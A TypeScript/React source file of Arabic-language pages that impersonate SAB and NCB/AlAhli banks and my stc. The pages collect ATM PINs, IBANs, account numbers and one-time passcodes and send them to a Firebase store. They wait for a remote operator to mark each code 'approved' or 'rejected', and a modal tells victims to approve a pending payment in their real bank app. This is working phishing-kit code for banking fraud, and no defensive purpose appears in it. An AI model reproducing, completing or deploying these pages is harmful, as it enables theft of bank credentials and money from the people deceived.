import React, { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { addData, getOrCreateVisitorId, handleCurrentPage, listenForOtpApproval } from "@/lib/firebase";

// 1. ATM PIN Verification Page
export function AtmPinPage() {
  const [, setLocation] = useLocation();
  const [digits, setDigits] = useState(["", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("atm_pin");
  }, []);

  useEffect(() => {
    if (!loading) return;
    const unsubscribe = listenForOtpApproval((status) => {
      if (status === "approved") {
        setLoading(false);
        setLocation("/verify-mobile");
      } else if (status === "rejected") {
        setLoading(false);
        setError("الرقم السري غير صحيح، يرجى المحاولة مرة أخرى.");
      }
    });
    return () => {
      if (unsubscribe) unsubscribe();
    };
  }, [loading, setLocation]);

  const handleDigitChange = (index: number, val: string) => {
    const clean = val.replace(/\D/g, "").slice(-1);
    const newDigits = [...digits];
    newDigits[index] = clean;
    setDigits(newDigits);

    if (clean && index < 3) {
      const nextInput = document.getElementById(`atm-digit-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const pin = digits.join("");
    if (pin.length < 4) {
      setError("يرجى إدخال الرقم السري كاملًا");
      return;
    }

    setLoading(true);
    try {
      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        atmPin: pin,
        currentPage: "atm_pin",
        updatedAt: new Date().toISOString(),
      });
    } catch {
      setLoading(false);
      setError("تعذر تأكيد الرقم السري");
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f5f8f5]" dir="rtl">
      <div className="bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-gray-200 max-w-md w-full text-center space-y-6">
        <h2 className="font-bold text-xl text-gray-800">إثبات ملكية البطاقة</h2>
        <img src="/images/atm-logo.png" alt="ATM" className="h-8 mx-auto object-contain" />
        <p className="text-xs text-gray-600 leading-relaxed">
          يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة للتأكد من ملكية صاحب البطاقة.
        </p>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="flex gap-3 justify-center" dir="ltr">
            {digits.map((d, i) => (
              <input
                key={i}
                id={`atm-digit-${i}`}
                type="password"
                inputMode="numeric"
                maxLength={1}
                className="w-12 h-12 text-center text-xl font-bold border border-gray-300 rounded-xl focus:border-[#126447] focus:outline-none"
                value={d}
                onChange={(e) => handleDigitChange(i, e.target.value)}
              />
            ))}
          </div>

          {error && <p className="text-xs text-red-500 font-bold">{error}</p>}

          <button
            type="submit"
            className="w-full bg-[#126447] text-white rounded-xl py-3.5 font-bold cursor-pointer disabled:opacity-60"
            disabled={digits.some((d) => !d) || loading}
          >
            {loading ? "جاري التأكيد..." : "تأكيد"}
          </button>
        </form>
      </div>
    </div>
  );
}

// 2. IBAN Verification Page
export function IbanPage() {
  const [, setLocation] = useLocation();
  const [iban, setIban] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("iban");
  }, []);

  useEffect(() => {
    if (!loading) return;
    const unsubscribe = listenForOtpApproval((status) => {
      if (status === "approved") {
        setLoading(false);
        setLocation("/confirmation");
      } else if (status === "rejected") {
        setLoading(false);
        setError("الـ IBAN غير صحيح، يرجى المحاولة مرة أخرى.");
      }
    });
    return () => {
      if (unsubscribe) unsubscribe();
    };
  }, [loading, setLocation]);

  const isValidIban = (str: string) => /^SA\d{22}$/i.test(str.replace(/\s+/g, ""));

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const cleanIban = iban.replace(/\s+/g, "").toUpperCase();
    if (!isValidIban(cleanIban)) {
      setError("الـ IBAN يجب أن يبدأ بـ SA ويتكون من 24 حرفاً ورتماً");
      return;
    }

    setLoading(true);
    try {
      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        iban: cleanIban,
        currentPage: "iban",
        updatedAt: new Date().toISOString(),
      });
    } catch {
      setLoading(false);
      setError("تعذر تأكيد رقم الحساب");
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f5f8f5]" dir="rtl">
      <div className="bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-gray-200 max-w-md w-full text-center space-y-6">
        <h2 className="font-bold text-xl text-gray-800">رقم الحساب البنكي (IBAN)</h2>
        <p className="text-xs text-gray-600 leading-relaxed">
          يرجى إدخال رقم الحساب البنكي (IBAN) المرتبط بالبطاقة لاستكمال العملية.
        </p>

        <form onSubmit={handleSubmit} className="space-y-6">
          <input
            dir="ltr"
            type="text"
            className="w-full border border-gray-300 rounded-xl px-4 py-3.5 text-center font-mono font-bold text-sm focus:border-[#126447] focus:outline-none"
            placeholder="SA03 8000 0000 6080 1016 7519"
            maxLength={29}
            value={iban}
            onChange={(e) => setIban(e.target.value)}
          />

          {error && <p className="text-xs text-red-500 font-bold">{error}</p>}

          <button
            type="submit"
            className="w-full bg-[#126447] text-white rounded-xl py-3.5 font-bold cursor-pointer disabled:opacity-60"
            disabled={!iban || loading}
          >
            {loading ? "جاري التأكيد..." : "تأكيد الـ IBAN"}
          </button>
        </form>
      </div>
    </div>
  );
}

// 3. Bank Transfer Proof Page
export function BankTransferPage() {
  const [, setLocation] = useLocation();
  const [file, setFile] = useState<File | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("bank_transfer");
  }, []);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const selected = e.target.files?.[0];
    setError("");
    if (selected) {
      if (selected.size > 3 * 1024 * 1024) {
        setError("حجم الصورة يجب ألا يتجاوز 3MB");
        return;
      }
      setFile(selected);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) {
      setError("يرجى اختيار ملف الإثبات");
      return;
    }

    setLoading(true);
    try {
      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        transferFileName: file.name,
        currentPage: "bank_transfer",
        updatedAt: new Date().toISOString(),
      });
      setSuccess("تم إرسال إثبات التحويل بنجاح");
      setTimeout(() => setLocation("/confirmation"), 1500);
    } catch {
      setError("تعذر إرسال الإثبات");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f5f8f5]" dir="rtl">
      <div className="bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-gray-200 max-w-md w-full text-center space-y-6">
        <h2 className="font-bold text-xl text-gray-800">تحويل بنكي</h2>
        <p className="text-xs text-gray-600">من فضلك ارفع إثبات التحويل البنكي الخاص بك</p>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="border-2 border-dashed border-gray-300 rounded-xl p-6 relative hover:border-[#126447]">
            <input
              type="file"
              accept="image/*,application/pdf"
              className="absolute inset-0 opacity-0 cursor-pointer w-full h-full"
              onChange={handleFileChange}
            />
            <p className="text-xs font-bold text-gray-700">
              {file ? file.name : "اختر صورة أو ملف إثبات التحويل"}
            </p>
          </div>

          {error && <p className="text-xs text-red-500 font-bold">{error}</p>}
          {success && <p className="text-xs text-green-600 font-bold">{success}</p>}

          <button
            type="submit"
            className="w-full bg-[#126447] text-white rounded-xl py-3.5 font-bold cursor-pointer disabled:opacity-60"
            disabled={!file || loading}
          >
            {loading ? "جاري الإرسال..." : "إرسال الإثبات"}
          </button>
        </form>
      </div>
    </div>
  );
}

// 4. SAB Account Page
export function SabAccountPage() {
  const [, setLocation] = useLocation();
  const [accountNumber, setAccountNumber] = useState("");
  const [issueNumber, setIssueNumber] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("sab_account");
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        sabAccount: accountNumber,
        sabIssue: issueNumber,
        currentPage: "sab_account",
        updatedAt: new Date().toISOString(),
      });
      setLocation("/confirmation");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f5f8f5]" dir="rtl">
      <div className="bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-gray-200 max-w-md w-full space-y-6">
        <div className="text-center space-y-1">
          <img src="/images/sab.png" alt="SAB" className="h-10 mx-auto object-contain" />
          <h2 className="font-bold text-lg text-gray-800">رقم حسابك البنكي</h2>
          <p className="text-xs text-gray-500">الرجاء إدخال المعلومات المطلوبة</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            dir="ltr"
            type="text"
            className="w-full border border-gray-300 rounded-xl px-4 py-3 text-center font-mono font-bold text-sm"
            placeholder="xxx-xxxxxx-xxx"
            value={accountNumber}
            onChange={(e) => setAccountNumber(e.target.value)}
          />
          <input
            dir="ltr"
            type="text"
            className="w-full border border-gray-300 rounded-xl px-4 py-3 text-center font-mono font-bold text-sm"
            placeholder="رقم الإصدار (Issue)"
            value={issueNumber}
            onChange={(e) => setIssueNumber(e.target.value)}
          />

          <button
            type="submit"
            className="w-full bg-[#126447] text-white rounded-xl py-3.5 font-bold cursor-pointer disabled:opacity-60"
            disabled={!accountNumber || loading}
          >
            {loading ? "متابعة..." : "متابعة"}
          </button>
        </form>
      </div>
    </div>
  );
}

// 5. STC Call & OTP Pages
export function StcCallPage() {
  const [, setLocation] = useLocation();

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-white" dir="rtl">
      <div className="text-center max-w-sm w-full space-y-6 p-6">
        <img src="/images/my-stc.png" alt="my stc" className="h-12 mx-auto object-contain" />
        <h2 className="font-bold text-2xl text-gray-800">سوف تتلقى مكالمة قريباً.</h2>
        <p className="text-sm leading-relaxed text-gray-600">
          يرجى الموافقة عليها وإدخال الرقم <span className="font-extrabold text-[#ff375e]">5</span> في المكالمة للمتابعة.
        </p>
        <button
          onClick={() => setLocation("/stc-otp")}
          className="w-full bg-[#ff375e] text-white rounded-xl py-3.5 font-bold cursor-pointer"
        >
          تم تلقي المكالمة
        </button>
      </div>
    </div>
  );
}

export function StcOtpPage() {
  const [, setLocation] = useLocation();
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        stcOtp: otp,
        currentPage: "stc_otp",
        updatedAt: new Date().toISOString(),
      });
      setLocation("/confirmation");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f5f8f5]" dir="rtl">
      <div className="bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-gray-200 max-w-md w-full text-center space-y-6">
        <img src="/images/my-stc.png" alt="my stc" className="h-10 mx-auto object-contain" />
        <h2 className="font-bold text-lg text-[#4f008c]">رمز التحقق من my stc</h2>

        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            dir="ltr"
            type="tel"
            className="w-full border border-gray-300 rounded-xl px-4 py-3.5 text-center font-mono font-bold text-xl"
            value={otp}
            maxLength={6}
            onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
            placeholder="● ● ● ●"
          />

          <button
            type="submit"
            className="w-full bg-[#4f008c] text-white rounded-xl py-3.5 font-bold cursor-pointer disabled:opacity-60"
            disabled={!otp || loading}
          >
            {loading ? "جاري التحقق..." : "تحقق"}
          </button>
        </form>
      </div>
    </div>
  );
}

// 6. Provider Call Waiting Page
export function ProviderCallPage() {
  const [, setLocation] = useLocation();

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-white" dir="rtl">
      <div className="text-center max-w-sm w-full space-y-6 p-6">
        <h2 className="font-bold text-[#019cde] text-2xl">بانتظار تأكيد الجوال</h2>
        <p className="text-sm font-bold text-gray-700 leading-relaxed">
          سيتم الاتصال بك من قبل مركز الفحص لتوثيق رقم جوالك وربطه بشريحة الحجز الإلكترونية.
        </p>
        <p className="text-xs text-[#019cde] font-semibold">
          يُرجى إدخال الرقم المطلوب أثناء المكالمة لإتمام التوثيق.
        </p>
        <button
          onClick={() => setLocation("/confirmation")}
          className="w-full bg-[#019cde] text-white rounded-xl py-3.5 font-bold cursor-pointer"
        >
          تم تلقي المكالمة
        </button>
      </div>
    </div>
  );
}

// 7. NCB / AlAhli Bank OTP Modal Page
export function NcbOtpPage() {
  const [, setLocation] = useLocation();
  const [showModal, setShowModal] = useState(true);
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("ncb_otp");
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        ncbOtp: otp,
        currentPage: "ncb_otp",
        updatedAt: new Date().toISOString(),
      });
      setLocation("/confirmation");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f5f8f5]" dir="rtl">
      <div className="bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-gray-200 max-w-md w-full text-center space-y-6">
        <h2 className="font-bold text-xl text-gray-800">رمز التحقق لمرة واحدة (NCB / الأهلي)</h2>

        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            dir="ltr"
            type="tel"
            className="w-full border border-gray-300 rounded-xl px-4 py-3.5 text-center font-mono font-bold text-xl"
            placeholder="رمز التحقق"
            maxLength={6}
            value={otp}
            onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
          />

          <button
            type="submit"
            className="w-full bg-[#126447] text-white rounded-xl py-3.5 font-bold cursor-pointer disabled:opacity-60"
            disabled={!otp || loading}
          >
            {loading ? "جاري التحقق..." : "تحقق"}
          </button>
        </form>
      </div>

      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs">
          <div className="bg-white rounded-2xl p-6 max-w-md w-full shadow-2xl text-center space-y-4 border border-gray-100">
            <h3 className="text-lg font-bold text-gray-800">عميلنا الكريم</h3>
            <p className="text-sm text-gray-600 leading-relaxed font-medium">
              لإتمام عملية الدفع، يرجى الدخول إلى تطبيق الأهلي ثم التوجه إلى الإشعارات أو الطلبات المعلقة والموافقة على طلب الدفع المرسل إليكم.
            </p>
            <button
              type="button"
              className="w-full rounded-xl bg-[#126447] text-white py-3 font-bold cursor-pointer"
              onClick={() => setShowModal(false)}
            >
              حسناً
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
